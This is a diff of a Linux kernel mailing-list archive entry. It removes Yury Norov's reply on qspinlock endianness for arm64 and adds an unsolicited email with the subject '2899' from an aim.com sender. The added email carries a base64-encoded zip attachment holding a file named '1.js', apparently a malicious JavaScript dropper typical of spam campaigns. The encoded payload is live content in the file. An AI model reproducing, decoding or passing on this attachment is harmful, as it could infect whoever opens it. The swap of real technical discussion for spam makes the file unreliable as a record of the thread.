@@ -1,89 +1,52 @@
-From: Yury Norov <ynorov@caviumnetworks.com>
-Subject: Re: [PATCH 3/3] arm64/locking: qspinlocks and qrwlocks support
-Date: Tue, 9 May 2017 22:37:19 +0300
-Message-ID: <20170509193719.is3naupydwuytzdt@yury-N73SV>
-References: <20170503145141.4966-1-ynorov@caviumnetworks.com>
- <20170503145141.4966-4-ynorov@caviumnetworks.com>
- <20170509044708.vvwgzhvdrqyljy6s@tardis>
- <20170509184829.scwjixgc2kxxxku7@yury-N73SV>
+From: <tchidrenplytoo@aim.com>
+Subject: 2899
+Date: Wed, 10 May 2017 08:15:15 -0000
+Message-ID: <149440411588.31457.2279608736320470391@interra.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: application/zip; name="351970933425.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-arch-owner@vger.kernel.org>
-Received: from mail-cys01nam02on0041.outbound.protection.outlook.com ([104.47.37.41]:50400
-        "EHLO NAM02-CY1-obe.outbound.protection.outlook.com"
-        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-        id S1750858AbdEIThc (ORCPT <rfc822;linux-arch@vger.kernel.org>);
-        Tue, 9 May 2017 15:37:32 -0400
-Content-Disposition: inline
-In-Reply-To: <20170509184829.scwjixgc2kxxxku7@yury-N73SV>
+Received: from 217.31.190.94.interra.ru ([94.190.31.217]:44069 "HELO
+        interra.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752338AbdEJIPU (ORCPT <rfc822;linux-arch@vger.kernel.org>);
+        Wed, 10 May 2017 04:15:20 -0400
+Content-Disposition: attachment
 Sender: linux-arch-owner@vger.kernel.org
 List-ID: <linux-arch.vger.kernel.org>
-To: Boqun Feng <boqun.feng@gmail.com>
-Cc: Will Deacon <will.deacon@arm.com>, Peter Zijlstra <peterz@infradead.org>, linux-kernel@vger.kernel.org, linux-arch@vger.kernel.org, linux-arm-kernel@lists.infradead.org, Adam Wallis <awallis@codeaurora.org>, Andrew Pinski <Andrew.Pinski@cavium.com>, Arnd Bergmann <arnd@arndb.de>, Catalin Marinas <catalin.marinas@arm.com>, Ingo Molnar <mingo@redhat.com>, Jan Glauber <jglauber@cavium.com>, Mark Rutland <mark.rutland@arm.com>, Pan Xinhui <xinhui.pan@linux.vnet.ibm.com>
+To: linux-arch@vger.kernel.org
 
-On Tue, May 09, 2017 at 09:48:29PM +0300, Yury Norov wrote:
-> On Tue, May 09, 2017 at 12:47:08PM +0800, Boqun Feng wrote:
-> > On Wed, May 03, 2017 at 05:51:41PM +0300, Yury Norov wrote:
-> > > From: Jan Glauber <jglauber@cavium.com>
-> > > 
-> > > Ported from x86_64 with paravirtualization support removed.
-> > > 
-> > > Signed-off-by: Jan Glauber <jglauber@cavium.com>
-> > > 
-> > > Note. This patch removes protection from direct inclusion of
-> > > arch/arm64/include/asm/spinlock_types.h. It's done because
-> > > kernel/locking/qrwlock.c file does it thru the header
-> > > include/asm-generic/qrwlock_types.h. Until now the only user
-> > > of qrwlock.c was x86, and there's no such protection too.
-> > > 
-> > > I'm not happy to remove the protection, but if it's OK for x86,
-> > > it should be also OK for arm64. If not, I think we'd fix it
-> > > for x86, and add the protection there too.
-> > > 
-> > > Yury
-> > > 
-> > > Signed-off-by: Yury Norov <ynorov@caviumnetworks.com>
-> 
-> [...]
-> 
-> > > +#define	queued_spin_unlock queued_spin_unlock
-> > > +/**
-> > > + * queued_spin_unlock - release a queued spinlock
-> > > + * @lock : Pointer to queued spinlock structure
-> > > + *
-> > > + * A smp_store_release() on the least-significant byte.
-> > > + */
-> > > +static inline void queued_spin_unlock(struct qspinlock *lock)
-> > > +{
-> > > +	smp_store_release((u8 *)lock, 0);
-> > 
-> > I think this part will cause endian issues, maybe you want something
-> > like what we do in queued_write_lock().
-> > 
-> > Have you tested this on an BE environment?
-> 
-> No. I think I have to. Thanks for the pointing it.
-> 
-> > 
-> > Regards,
-> > Boqun
-> 
-> I think it's just the issue of copying from x86, and there's no any
-> specific need to cast to u8* type on arm64. So the correct version of
-> it would be like this, I believe: smp_store_release(&lock->val).
-> 
-> Yury
-
-Oops, it would rather be like this:
-
-static inline void queued_spin_unlock(struct qspinlock *lock)
-{
-#if IS_BUILTIN(CONFIG_CPU_BIG_ENDIAN)
-       smp_store_release((u8 *) &lock->val + 3, 0);
-#else
-       smp_store_release((u8 *) &lock->val, 0);
-#endif
-}
-
-Or with the helper, like here in ppc port:
-https://www.spinics.net/lists/linux-virtualization/msg29390.html
+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
+AC0HAAAAAA==
